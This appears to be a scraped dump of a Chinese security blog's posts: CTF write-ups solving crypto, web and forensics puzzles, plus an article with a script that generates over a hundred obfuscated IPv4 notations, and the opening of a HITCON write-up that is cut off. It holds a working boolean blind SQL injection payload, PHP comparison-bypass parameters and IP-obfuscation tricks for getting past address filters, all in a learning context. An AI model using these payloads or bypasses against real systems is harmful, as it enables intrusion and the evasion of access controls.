的提示，猜想做出来的哈希就是key，那么就不需要IV，那么就可能是ECB或CTR模式。但哈希是对谁做的呢，产生了很多联想，做了一些尝试无果。后来猛然发现，基本上能用来产生哈希用于AES加密并产生BASE64串的东西一定是在图片生成之前就存在。那么可能性就不多了，甚至没有了。比赛快结束前注意到试试QR的哈希 这一提示，不报什么希望地试了下字符串\u0026quot;QR\u0026quot;的哈希，没想到成了。解密后得到压缩包密码1Znmpr4jzChwxXqB 。 打开压缩包后迎面而来又一张QR，解出bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so= 。很容易想到这是要故技重施，又要找一串key。因为key可能是16、24或32字节，很自然想到上一次解密就试过的16个字节的文件名s776051080zum92N ，一试便成，得到XCTF{W0W_U_G0T_TH3_FL4G} 。 勉强拿到门票，即将和大佬们一起学习，有点兴奋：） 附上解题脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #coding:utf-8 import base64,hashlib from Crypto.Cipher import AES key = hashlib.md5(\u0026#39;QR\u0026#39;).hexdigest() secret=\u0026#34;3ukka4wZf2Q9H8PEI5YKFA==\u0026#34; # 图片扫码结果 def decrypt(enc): aes = AES.new(key, AES.MODE_ECB) return aes.decrypt(enc) res=decrypt(base64.b64decode(secret)) print len(res),res #------------------------------------------- key = \u0026#34;s776051080zum92N\u0026#34; #压缩包里面图片的文件名 secret=\u0026#34;bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so=\u0026#34; #压缩包里图片是涨二维码，扫出来这个 def decrypt2(enc): aes = AES.new(key, AES.MODE_ECB) return aes.decrypt(enc) res=decrypt2(base64.b64decode(secret)) print len(res),res #------运行结果-------------- #16 1Znmpr4jzChwxXqB #32 XCTF{W0W_U_G0T_TH3_FL4G} ","permalink":"https://ret2neo.cn/post/180107xmancamponlinewp/","summary":"中二的成长之路 我用真心对你，你却用QR敷衍我。\n附件下载\n试试QR的哈希，并且注意红字。 使用图片显示的某些信息做哈希 再次观察图片，看看不一样的颜色和字体，也许需要做一下哈希 扫描题目给的图片得到3ukka4wZf2Q9H8PEI5YKFA== ，但直接base64解码得到乱码。谷歌搜索发现可能性很多，各种尝试无果。 使用binwalk分离出压缩包。不是伪加密，爆破也无果。 经过主办方提示看看不一样的颜色和字体 注意到AES，搜索发现与今年9月份的问鼎杯CTF一道题极为相似，就是压缩包的密码经过AES加密后再进行base64编码。这样就有了基本的思路。但还缺少一些信息，比如AES采用哪种模式，key是什么，如果有IV，又会是什么。 对着三次关于哈希 的提示，猜想做出来的哈希就是key，那么就不需要IV，那么就可能是ECB或CTR模式。但哈希是对谁做的呢，产生了很多联想，做了一些尝试无果。后来猛然发现，基本上能用来产生哈希用于AES加密并产生BASE64串的东西一定是在图片生成之前就存在。那么可能性就不多了，甚至没有了。比赛快结束前注意到试试QR的哈希 这一提示，不报什么希望地试了下字符串\u0026quot;QR\u0026quot;的哈希，没想到成了。解密后得到压缩包密码1Znmpr4jzChwxXqB 。 打开压缩包后迎面而来又一张QR，解出bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so= 。很容易想到这是要故技重施，又要找一串key。因为key可能是16、24或32字节，很自然想到上一次解密就试过的16个字节的文件名s776051080zum92N ，一试便成，得到XCTF{W0W_U_G0T_TH3_FL4G} 。 勉强拿到门票，即将和大佬们一起学习，有点兴奋：） 附上解题脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #coding:utf-8 import base64,hashlib from Crypto.Cipher import AES key = hashlib.md5(\u0026#39;QR\u0026#39;).hexdigest() secret=\u0026#34;3ukka4wZf2Q9H8PEI5YKFA==\u0026#34; # 图片扫码结果 def decrypt(enc): aes = AES.new(key, AES.MODE_ECB) return aes.decrypt(enc) res=decrypt(base64.b64decode(secret)) print len(res),res #------------------------------------------- key = \u0026#34;s776051080zum92N\u0026#34; #压缩包里面图片的文件名 secret=\u0026#34;bqIGBfOGuOsxLYV16OI7xRNAZrcFdYLJtHaDym2O7so=\u0026#34; #压缩包里图片是涨二维码，扫出来这个 def decrypt2(enc): aes = AES.","title":"“华为杯”极客出发XMan冬令营线上CTF解题赛"},{"content":"WEB WEB2 Flag在哪里?\n链 接 http://10sBB7f7sSo9.isec.anscen.cn\nburp抓包后向login.php常规 post user[]=admin\u0026amp;pass[]=a\u0026amp;submit=submit 。 得到flag{7538a033d41f442cbae9578d4c189615} 。\nWEB4 你找得到Flag吗？\n链 接http://3jhg9aks3.isec.anscen.cn\nfuzz发现某些响应包头部会多出Set-Cookie: remind=U1FMSQ%3D%3D; 字样，依此进行布尔型盲注。 使用intruder的Cluster Bomb 模式自动化，攻击向量为content=b'||substr((select/**/hex(database())),$1$,1)='$6$'# 处理得到flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 r=\u0026#39;p\u0026#39;+\u0026#39;x\u0026#39;*100 r=[i for i in r] c0=[32,42]# 表示数据的第32，42位是\u0026#39;0\u0026#39; c1=[6,18,30,70,72,76] c2=[40,60] c3=[11,15,21,23,25,31,33,35,37,38,41,43,45,49,51,54,57,61,65,67,73,74,75] c4=[14,20,56] c5=[16,28,36,46,48,68] c6=[1,2,3,5,7,13,17,19,22,27,29,39,44,47,53,55,59,63,64,69,71] c7=[8,9,12,24,52,62,77] c8=[26,50,58] c9=[34,66] ca=[] cb=[10]# 表示数据的第10位是\u0026#39;b\u0026#39; cc=[4] cd=[78] ce=[] cf=[] call=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,ca,cb,cc,cd,ce,cf] for i in xrange(len(call)): for j in call[i]: r[j]=hex(i)[2:] print \u0026#39;\u0026#39;.join(r) #666c61677b3764356164363738656130393533623036356538376364386237663935616133317d #flag{7d5ad678ea0953b065e87cd8b7f95aa31} 题外话：使用hex()编码待查询数据再进行注入会把数据长度增长一倍，但待选字符集大小将减少到十六个，对于像本题这样没法二分的情况很高效。对于可以二分查找的情况复杂度和直接注入是一样的，还可以避开不可见字符的干扰。 WEB5 还没找到flag么\n链\t接http://8ah3ka0akj.isec.anscen.cn\n查看源码，循序渐进。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 view-source://http://8ah3ka0akj.isec.anscen.cn/?key1=php://input\u0026amp;key2=skwerl11\u0026amp;key3=665.99999999999999\u0026amp;key4=99999999999999999999999999999999999999 post Hello hacker! ----------------------------------------------------------------------- Hello hacker! Do you want the flag?\u0026lt;br\u0026gt; \u0026lt;!-- $k1=$_GET[\u0026#39;key1\u0026#39;]; $k2=$_GET[\u0026#39;key2\u0026#39;]; if(file_get_contents($k1)===\u0026#34;Hello hacker!\u0026#34;){ echo \u0026#39;welcome! Hacker!\u0026lt;br\u0026gt;\u0026#39;; } --\u0026gt;sjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj welcome! Hacker!\u0026lt;br\u0026gt;\u0026lt;!-- if(md5($k2)\u0026gt;666666*666666) { include(\u0026#39;ctf.php\u0026#39;); } --\u0026gt; Come on, flag is coming\u0026lt;br\u0026gt;flag{0fd14555a5d275b253aff1bae158ca7c}\u0026lt;!-- $k3=$_GET[\u0026#39;key3\u0026#39;]; $k4=$_GET[\u0026#39;key4\u0026#39;]; if(intval($k3)\u0026lt;666) { if($k3==666) { echo \u0026#39;Come on, flag is coming\u0026lt;br\u0026gt;\u0026#39;; if($k4\u0026gt;0) { if(intval($k3+$k4)\u0026lt;666) echo $flag; } } } --\u0026gt; MISC MISC4 到底什么才是打开flag的正确姿势？\n链 接http://1e3g6S39v5M9.isec.anscen.cn\n解压Misc_Flow.rar 得到flag.rar 和Hints.txt 两个文件，其中hint.txt 提示Blasting code???No No No!There is another txt file. ，尝试用alternatestreamview.exe 扫描文件夹，得到隐藏的流文件:password.txt:$DATA ，提取出内容是c1d6159d94cc00dfeafde4f5ff7639ade491f7639ade4f5ff7639ade491feaf5ff7639ad 。\n发现flag.rar 无法作为压缩包打开，修复文件头为正确的52617221 后将上面字符串作为密码即可打开，得到包含flag的图片。flag{43cca4b3de2097b9558efefb0ecc3588}\nMISC5 截获了一份敌军的流量包，据悉暗号就在里面\n链 接http://2S8h7F84v4M0.isec.anscen.cn\n过滤出ICMP包，按顺序排列，发现数据包长度可疑。\n1 2 3 a=[144,150,139,145,165,91,109,151,122,113,106,119,93,167] print \u0026#39;\u0026#39;.join([chr(i-42) for i in a]) # flag{1CmPG@M3} MISC? can\u0026rsquo;t see anything\n什么也看不见\n感谢川大师傅提供思路。\n1 2 3 4 5 6 7 8 9 10 11 题图末尾有base32字符串解码后得到 P4000000N500100010000000006050O405103QS28895O011SR103QS28895O011SR103QS288193084P30081001000000000000200N0478747R27616P6660000000000000002000000000000004200800000006200000062O2NO8Q84O413Q79500800090004100S12010O40510N6Q0Q8Q039292535P025PP3Q39P4P82O3053R4Q4N4537343R4631343Q4P47O63SNP494OPO4478747R27616P666000000800000006200000062O2NO8Q84O413Q7950080000000414030O405 将NOPQRS依次替换为ABCDEF得到十六进制串 C4000000A500100010000000006050B405103DF28895B011FE103DF28895B011FE103DF288193084C30081001000000000000200A0478747E27616C6660000000000000002000000000000004200800000006200000062B2AB8D84B413D79500800090004100F12010B40510A6D0D8D039292535C025CC3D39C4C82B3053E4D4A4537343E4631343D4C47B63FAC494BCB4478747E27616C666000000800000006200000062B2AB8D84B413D7950080000000414030B405 将字符串反序，得到504B开头的字符串 504B0304140000000800597D314B48D8BA2B260000002600000008000000666C61672E7478744BCB494CAF36B74C4D3431364E3437354A4D4E3503B28C4C93D3CC520C535292930D8D0D6A01504B01021F00140009000800597D314B48D8BA2B2600000026000000080024000000000000002000000000000000666C61672E7478740A00200000000000010018003C480391882FD301EF110B59882FD301EF110B59882FD301504B050600000000010001005A0000004C 使用十六进制编辑器保存为rar文件 打开可见flag.txt文件 flag{79ea433a752ece633a25cf6d1ddcc130} ","permalink":"https://ret2neo.cn/post/171223meiyactfwp/","summary":"WEB WEB2 Flag在哪里?\n链 接 http://10sBB7f7sSo9.isec.anscen.cn\nburp抓包后向login.php常规 post user[]=admin\u0026amp;pass[]=a\u0026amp;submit=submit 。 得到flag{7538a033d41f442cbae9578d4c189615} 。\nWEB4 你找得到Flag吗？\n链 接http://3jhg9aks3.isec.anscen.cn\nfuzz发现某些响应包头部会多出Set-Cookie: remind=U1FMSQ%3D%3D; 字样，依此进行布尔型盲注。 使用intruder的Cluster Bomb 模式自动化，攻击向量为content=b'||substr((select/**/hex(database())),$1$,1)='$6$'# 处理得到flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 r=\u0026#39;p\u0026#39;+\u0026#39;x\u0026#39;*100 r=[i for i in r] c0=[32,42]# 表示数据的第32，42位是\u0026#39;0\u0026#39; c1=[6,18,30,70,72,76] c2=[40,60] c3=[11,15,21,23,25,31,33,35,37,38,41,43,45,49,51,54,57,61,65,67,73,74,75] c4=[14,20,56] c5=[16,28,36,46,48,68] c6=[1,2,3,5,7,13,17,19,22,27,29,39,44,47,53,55,59,63,64,69,71] c7=[8,9,12,24,52,62,77] c8=[26,50,58] c9=[34,66] ca=[] cb=[10]# 表示数据的第10位是\u0026#39;b\u0026#39; cc=[4] cd=[78] ce=[] cf=[] call=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,ca,cb,cc,cd,ce,cf] for i in xrange(len(call)): for j in call[i]: r[j]=hex(i)[2:] print \u0026#39;\u0026#39;.","title":"第二届美亚柏科邀请赛"},{"content":"不知有多少人了解IP地址127.0.0.1 一定程度上是完全等价于127.1 和0x7f.1 的，不过我从上回看到ping 127.1 能正常工作开始，就一直很好奇背后的原因，最近又在 一个CTF题目 用到基于IP表示法的技巧，于是决定稍微探索一下。\n我发现一个IPv4地址可能拥有上百个不同的表示形式，而由于一些历史原因，在这方面的标准尚未完全统一，因此这些形式在大部分情况下都是可被正常解析的(举个例子，URL http://000000300.0x000000000a8.00102.00000000351 会解析成http://192.168.66.233/ )，这就在绕过限制和其他一些安全问题上提供了想象的空间。\n本文主要介绍这些混淆背后的历史原因和原理，至于如何生成适用形式的IP也不复杂，并且常常需要考虑具体场景。不过我写了个小脚本，放在了GitHub 上，有需要可作为参考。\n关于IP和IPv4地址 IPv4是应用于分组交换网络的无状态协议，是网际协议(Internet Protocol , IP)的第四个版本，也是第一个投入生产的版本，1983年开始首先应用在ARPANET项目中。\nIP地址用以标记使用IP接入网络的设备。IPv4把IP地址定义为32位二进制数，可表示 2**32 约42亿个网络设备接口，早期使用分类网络(Classful Addressing)的方法划分为五类，随着IP地址需求的增长，这种分类法被无类别域间路由(Classless Inter-Domain Routing , CIDR)取代。【参见RFC 1517-1519】\nIPv4 地址句法的历史与现状 一个IPv4地址除了被机器解析外，还会用在很多需要人类阅读理解的地方，而一个32位二进制数(如11000000101010000100001011101001 )对人类是很不友好的，因此人们必然会需要某种文本描述(textual representation) 。我们现在最常见到的点分十进制表示法(dotted-decimal notation) 就是其一。什么是点分十进制呢？就是由点号分隔开的四个十进制数(如192.168.66.233 ） ，其中每个十进制数表示一个字节(octets , 八位二进制数)，较高有效位在左，较低有效位在右。\n尽管从上面的描述我们可以了解到IPv4地址的常见形式，但是关于IP地址的文本描述具体应该如何，似乎从来没有严谨全面的定义。另一方面，IP作为互联网中较为基础的设施之一，常常不可避免地出现在各种协议的描述里，这些描述有时顺带也会提及IP地址的写法，但提法不尽相同，也并不足够强硬和严谨。这篇 文章 细数了一些RFC文档里出现过的描述 ，可以看到不同场景下出现过#127.0.0.1 、[127.0.0.1] 、127.000.000.001 等形式的写法。\n当IETF版本的句法处于无意识发展时，BSD版本的句法悄然登场。一个权威的解释大概也不是那么重要，尤其是当一项技术的某种实现已经被广泛使用。对于IPv4地址而言，这个实现就是4.2BSD 。 4.2BSD 引入了名为inet_aton() 的用于将字符串解释为IP地址的函数，这个函数被广泛地复制和演绎，从而使得BSD版本的关于IP地址文本描述的句法成为了事实上的标准——能够被inet_aton() 解释即合标准。至于inet_aton() 接受哪些形式的IP地址，将在下文给出。\n这里先简要谈谈这两种句法的异同。\n相同点 对于最大多数情况——不带前导0的点分十进制( dotted decimal octets with leading zeroes suppressed ) ，两者都是支持的。\n不同点 BSD版本的许多句法IETF版本都不支持 ***最重要的。***IETF版本的句法在所有表述中始终如一地暗示要将带有前导0的数字解释为十进制，而BSD版本的句法在实现中将带有前导0的数字解释为八进制。举个例子，前者认为192.168.1.011 等价于192.168.1.11 ，而后者认为等价于192.168.1.9 。 值得一提的是IPv6 的发展也对此产生了一定的影响。IPv6中的函数inet_pton() 在处理IPv4地址时只接受点分十进制，并且明确地拒绝了一些能够被inet_aton() 接受的句法。然而，对于是否接受前导0语焉不详。\n此外，2005年的RFC 3986 提出取两者安全的公共子集作为严格的IP地址句法定义，形成倾向于IETF的标准，但同时保持对BSD实现的后向兼容。这个子集的定义如下，简单说就是用点号分隔的四个十进制数，禁止使用前导0。\n1 2 3 4 5 6 7 8 9 10 11 12 13 A 32-bit IPv4 address is divided into four octets. Each octet is represented numerically in decimal, using the minimum possible number of digits (leading zeroes are not used, except in the case of 0 itself). The four encoded octets are given most-significant first, separated by period characters. IPv4address = d8 \u0026#34;.\u0026#34; d8 \u0026#34;.\u0026#34; d8 \u0026#34;.\u0026#34; d8 d8 = DIGIT ; 0-9 / %x31-39 DIGIT ; 10-99 / \u0026#34;1\u0026#34; 2DIGIT ; 100-199 / \u0026#34;2\u0026#34; %x30-34 DIGIT ; 200-249 / \u0026#34;25\u0026#34; %x30-35 ; 250-255 inet_aton()允许哪些形式的IP地址 a single number giving the entire 32-bit address. dot-separated octet values. It also interpreted two intermediate syntaxes: octet-dot-octet-dot-16bits, intended for class B addresses octet-dot-24bits, intended for class A addresses. It also allowed some flexibility in how the individual numeric parts were specified. it allowed octal and hexadecimal in addition to decimal, distinguishing these radices by using the C language syntax involving a prefix \u0026ldquo;0\u0026rdquo; or \u0026ldquo;0x\u0026rdquo;, and allowed the numbers to be arbitrarily long. 归纳起来有这么几种情况\nIP地址只有一个部分，表示为a ，每部分表示32位二进制数 IP地址有两个部分，表示为a.b ，a 表示8位二进制数，b 表示24位二进制数 IP地址有三部分，表示为a.b.c ，a 和b 各表示8位二进制数，c 表示16位二进制数 IP地址有四个部分，表示为a.b.c.d ，每部分表示8位二进制数 以及这么两个重点\n每一个部分可以都有三种表示法，十进制、十六进制和八进制，用前缀表明进制。 每部分的数字可以是任意长度。（这意味着可以把077 和0xff 表示成000000077 和0x00000ff 等） 到此为止，可以看到127.1 属于上述第二种情况，最开始的疑惑也就不复存在。\n这应该算是一个历史遗留问题，不过在未来一段时间内，在广泛涉及URL和IP地址的浏览器和许多应用层程序(如Ping、telnet、wget、curl、GET、HEAD等)中，符合BSD版本句法的IPv4地址表示形式仍然是可接受的，而这些表示可以多达上百种，就可能在一些安全问题上发挥出人意料的作用。\n生成一个IP地址的上百种形式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 # coding:utf8 # by https://findneo.github.io/ # ref: https://linux.die.net/man/3/inet_aton # https://tools.ietf.org/html/draft-main-ipaddr-text-rep-02 # https://tools.ietf.org/html/rfc3986 # http://www.linuxsa.org.au/pipermail/linuxsa/2007-September/088131.html import itertools as it import random ip = \u0026#39;192.168.66.233\u0026#39; i = ip.split(\u0026#39;.\u0026#39;) def f(x): return hex(int(x))[2:].zfill(2) hi = [f(i[0]), f(i[1]), f(i[2]), f(i[3]), # hi[4]:part c of \u0026#34;a.b.c\u0026#34; f(i[2]) + f(i[3]), # hi[5]:part b of \u0026#34;a.b\u0026#34; f(i[1]) + f(i[2]) + f(i[3]), # hi[6]:\u0026#39;a\u0026#39; f(i[0]) + f(i[1]) + f(i[2]) + f(i[3]), ] def hex2oct(x): \u0026#34;\u0026#34;\u0026#34; arbitrary length is supported \u0026#34;\u0026#34;\u0026#34; moreZero = random.choice(range(10)) return oct(int(x, 16)).zfill(moreZero + len(oct(int(x, 16)))).strip(\u0026#39;L\u0026#39;) def hex2int(x): return str(int(x, 16)) def hex2hex(x): moreZero = random.choice(range(10)) return \u0026#39;0x\u0026#39; + \u0026#39;0\u0026#39; * moreZero + x p = [hex2hex, hex2int, hex2oct] res = [] # \u0026#34;a.b.c.d\u0026#34; # Each of the four numeric parts specifies a byte of the address; # the bytes are assigned in left-to-right order to produce the binary address. res.extend([\u0026#39;.\u0026#39;.join([i[0](hi[0]), i[1](hi[1]), i[2](hi[2]), i[3](hi[3])]) for i in it.product(p, p, p, p)]) # \u0026#34;a.b.c\u0026#34; # Parts a and b specify the first two bytes of the binary address. # Part c is interpreted as a 16-bit value that defines the rightmost two bytes of the binary address. res.extend([\u0026#39;.\u0026#39;.join([i[0](hi[0]), i[1](hi[1]), i[2](hi[4])]) for i in it.product(p, p, p)]) # \u0026#34;a.b\u0026#34; # Part a specifies the first byte of the binary address. # Part b is interpreted as a 24-bit value that defines the rightmost three bytes of the binary address. res.extend([\u0026#39;.\u0026#39;.join([i[0](hi[0]), i[1](hi[5])]) for i in it.product(p, p)]) # \u0026#34;a\u0026#34; # The value a is interpreted as a 32-bit value that is stored directly into the binary address without any byte rearrangement. res.extend([\u0026#39;.\u0026#39;.join([i[0](hi[6])]) for i in it.product(p)]) for i in xrange(len(res)): print \u0026#34;[%d]\\t%s\u0026#34; % (i, res[i]) # ------------------------------------------------------------------------------- # test import os except_ip = [] def test_notation(ip_notation): global except_ip x = os.popen(\u0026#39;ping -n 1 -w 0.5 \u0026#39; + ip_notation).readlines() answer = x[0] if len(x) == 1 else x[1] if ip not in answer: except_ip.append(ip_notation) return answer.decode(\u0026#39;gbk\u0026#39;).strip() print \u0026#34;\\nchecking. . .\u0026#34;, for i in xrange(len(res)): # print \u0026#34;[%d] %s\\t\\t\\t%s\u0026#34; % (i, res[i], test_notation(res[i])) test_notation(res[i]) print \u0026#39;.\u0026#39;, print \u0026#34;\\n\\ntotally %d notations of ip checked ,all are equivalent to %s\u0026#34; % (len(res), ip) if len(except_ip): print \u0026#34;except for notations following:\\n\u0026#34;, except_ip 结果列表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 [0]\t0x000c0.0xa8.0x0000042.0x0e9 [1]\t0x0000c0.0x0000000a8.0x000042.233 [2]\t0x000000000c0.0x000000000a8.0x000000042.0000000000351 [3]\t0x000c0.0x000000a8.66.0x000000e9 [4]\t0xc0.0xa8.66.233 [5]\t0x000000c0.0x000000000a8.66.0351 [6]\t0x000000000c0.0x00000000a8.0000102.0x0000000e9 [7]\t0x0000c0.0x000a8.00102.233 [8]\t0x00000000c0.0x00000a8.00000000102.0000000351 [9]\t0x00c0.168.0x0042.0x00000e9 [10]\t0x000000c0.168.0x00000000042.233 [11]\t0x0000000c0.168.0x0042.0000000351 [12]\t0x00000000c0.168.66.0x000000000e9 [13]\t0x000000c0.168.66.233 [14]\t0xc0.168.66.00351 [15]\t0xc0.168.0000102.0x00000e9 [16]\t0x00c0.168.000000000102.233 [17]\t0x0000c0.168.00102.00000000351 [18]\t0x0000000c0.0000250.0x00042.0xe9 [19]\t0x000c0.0000000250.0x000000042.233 [20]\t0x0c0.0000000250.0x00042.00000000351 [21]\t0xc0.0000000250.66.0xe9 [22]\t0x0000000c0.00000250.66.233 [23]\t0x000c0.00250.66.000000351 [24]\t0x00000c0.00000250.0000102.0xe9 [25]\t0x00000c0.000250.00102.233 [26]\t0x000c0.00000250.0000000000102.00000351 [27]\t192.0x000000000a8.0x0042.0x0e9 [28]\t192.0x0000000a8.0x0042.233 [29]\t192.0x0000000a8.0x0000042.0000351 [30]\t192.0x000000a8.66.0xe9 [31]\t192.0x00000000a8.66.233 [32]\t192.0x0000000a8.66.000351 [33]\t192.0xa8.00102.0x0000e9 [34]\t192.0x00a8.00102.233 [35]\t192.0x00000a8.000102.0000000000351 [36]\t192.168.0x42.0xe9 [37]\t192.168.0x000042.233 [38]\t192.168.0x0000000042.000000351 [39]\t192.168.66.0x000000000e9 [40]\t192.168.66.233 [41]\t192.168.66.0000351 [42]\t192.168.000102.0x00e9 [43]\t192.168.00000102.233 [44]\t192.168.00000000102.00000351 [45]\t192.0000000250.0x0000000042.0x000e9 [46]\t192.000250.0x00000000042.233 [47]\t192.0250.0x000000042.0351 [48]\t192.000250.66.0x000000e9 [49]\t192.0000250.66.233 [50]\t192.0000000000250.66.000351 [51]\t192.000000000250.00000102.0xe9 [52]\t192.00250.0000000102.233 [53]\t192.0250.00000000102.0351 [54]\t0000000300.0x000a8.0x0000000042.0x0000e9 [55]\t000000000300.0x000000000a8.0x0000000042.233 [56]\t0000000300.0x000000a8.0x00000042.000351 [57]\t0000000300.0x0000a8.66.0x000000000e9 [58]\t0000000000300.0x00000000a8.66.233 [59]\t0000000300.0x0a8.66.0000351 [60]\t0000300.0x00a8.0102.0x00e9 [61]\t0000300.0x0000000a8.000102.233 [62]\t000000300.0x000000000a8.00102.00000000351 [63]\t0000300.168.0x000042.0xe9 [64]\t0300.168.0x042.233 [65]\t0000000300.168.0x0000000042.0000351 [66]\t0000000300.168.66.0x000000000e9 [67]\t000300.168.66.233 [68]\t0000300.168.66.00000351 [69]\t000000000300.168.00102.0x00e9 [70]\t0300.168.000000000102.233 [71]\t0000300.168.000000102.00000351 [72]\t0000000000300.00000000250.0x0042.0x00000000e9 [73]\t00300.000000000250.0x42.233 [74]\t00000300.000250.0x00000000042.0000351 [75]\t000300.000000250.66.0x000000000e9 [76]\t0000000000300.000000250.66.233 [77]\t000000300.0250.66.00000351 [78]\t0000000300.000250.000000102.0xe9 [79]\t000300.00000000250.000102.233 [80]\t000000000300.0000000250.000102.0000000000351 [81]\t0x000000c0.0x00a8.0x42e9 [82]\t0x0000c0.0x000a8.17129 [83]\t0x000000c0.0x0000a8.00041351 [84]\t0x000000000c0.168.0x000042e9 [85]\t0x0000c0.168.17129 [86]\t0x0000c0.168.000041351 [87]\t0x0000000c0.00000000250.0x000000042e9 [88]\t0x00000c0.000000000250.17129 [89]\t0x000c0.00250.00041351 [90]\t192.0x0a8.0x0000000042e9 [91]\t192.0x000a8.17129 [92]\t192.0x000000a8.0041351 [93]\t192.168.0x000042e9 [94]\t192.168.17129 [95]\t192.168.00041351 [96]\t192.00250.0x000000042e9 [97]\t192.0250.17129 [98]\t192.000000000250.000041351 [99]\t00000300.0x00000a8.0x000000042e9 [100]\t000000000300.0x00000a8.17129 [101]\t00000300.0x000a8.00000000041351 [102]\t0300.168.0x000000042e9 [103]\t0300.168.17129 [104]\t00000000300.168.00000000041351 [105]\t0300.000000000250.0x0042e9 [106]\t000000000300.0000250.17129 [107]\t000000000300.00250.00000000041351 [108]\t0x0c0.0x00000a842e9 [109]\t0x00c0.11027177 [110]\t0x000000c0.0052041351 [111]\t192.0x0000a842e9 [112]\t192.11027177 [113]\t192.000000000052041351 [114]\t00000300.0x0000000a842e9 [115]\t0000000300.11027177 [116]\t0000000300.000000000052041351 [117]\t0x0000000c0a842e9 [118]\t3232252649 [119]\t000000030052041351 checking. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . totally 120 notations of ip checked ,all are equivalent to 192.168.66.233 [Finished in 3.1s] ","permalink":"https://ret2neo.cn/post/171125textualrepresentationofipaddress/","summary":"不知有多少人了解IP地址127.0.0.1 一定程度上是完全等价于127.1 和0x7f.1 的，不过我从上回看到ping 127.1 能正常工作开始，就一直很好奇背后的原因，最近又在 一个CTF题目 用到基于IP表示法的技巧，于是决定稍微探索一下。\n我发现一个IPv4地址可能拥有上百个不同的表示形式，而由于一些历史原因，在这方面的标准尚未完全统一，因此这些形式在大部分情况下都是可被正常解析的(举个例子，URL http://000000300.0x000000000a8.00102.00000000351 会解析成http://192.168.66.233/ )，这就在绕过限制和其他一些安全问题上提供了想象的空间。\n本文主要介绍这些混淆背后的历史原因和原理，至于如何生成适用形式的IP也不复杂，并且常常需要考虑具体场景。不过我写了个小脚本，放在了GitHub 上，有需要可作为参考。\n关于IP和IPv4地址 IPv4是应用于分组交换网络的无状态协议，是网际协议(Internet Protocol , IP)的第四个版本，也是第一个投入生产的版本，1983年开始首先应用在ARPANET项目中。\nIP地址用以标记使用IP接入网络的设备。IPv4把IP地址定义为32位二进制数，可表示 2**32 约42亿个网络设备接口，早期使用分类网络(Classful Addressing)的方法划分为五类，随着IP地址需求的增长，这种分类法被无类别域间路由(Classless Inter-Domain Routing , CIDR)取代。【参见RFC 1517-1519】\nIPv4 地址句法的历史与现状 一个IPv4地址除了被机器解析外，还会用在很多需要人类阅读理解的地方，而一个32位二进制数(如11000000101010000100001011101001 )对人类是很不友好的，因此人们必然会需要某种文本描述(textual representation) 。我们现在最常见到的点分十进制表示法(dotted-decimal notation) 就是其一。什么是点分十进制呢？就是由点号分隔开的四个十进制数(如192.168.66.233 ） ，其中每个十进制数表示一个字节(octets , 八位二进制数)，较高有效位在左，较低有效位在右。\n尽管从上面的描述我们可以了解到IPv4地址的常见形式，但是关于IP地址的文本描述具体应该如何，似乎从来没有严谨全面的定义。另一方面，IP作为互联网中较为基础的设施之一，常常不可避免地出现在各种协议的描述里，这些描述有时顺带也会提及IP地址的写法，但提法不尽相同，也并不足够强硬和严谨。这篇 文章 细数了一些RFC文档里出现过的描述 ，可以看到不同场景下出现过#127.0.0.1 、[127.0.0.1] 、127.000.000.001 等形式的写法。\n当IETF版本的句法处于无意识发展时，BSD版本的句法悄然登场。一个权威的解释大概也不是那么重要，尤其是当一项技术的某种实现已经被广泛使用。对于IPv4地址而言，这个实现就是4.2BSD 。 4.2BSD 引入了名为inet_aton() 的用于将字符串解释为IP地址的函数，这个函数被广泛地复制和演绎，从而使得BSD版本的关于IP地址文本描述的句法成为了事实上的标准——能够被inet_aton() 解释即合标准。至于inet_aton() 接受哪些形式的IP地址，将在下文给出。\n这里先简要谈谈这两种句法的异同。\n相同点 对于最大多数情况——不带前导0的点分十进制( dotted decimal octets with leading zeroes suppressed ) ，两者都是支持的。\n不同点 BSD版本的许多句法IETF版本都不支持 ***最重要的。***IETF版本的句法在所有表述中始终如一地暗示要将带有前导0的数字解释为十进制，而BSD版本的句法在实现中将带有前导0的数字解释为八进制。举个例子，前者认为192.168.1.011 等价于192.168.1.11 ，而后者认为等价于192.","title":"IP地址混淆"},{"content":" from HITCON CTF 2017 2017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC\nhttps://ctf2017.hitcon.org/\nBabyFirst Revenge Do you remember BabyFirst from HITCON CTF 2015?\nThis is the harder version!\nhttp://52.199.204.34/\n源码 1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $sandbox = \u0026#39;/www/sandbox/\u0026#39; . md5(\u0026#34;orange\u0026#34; . 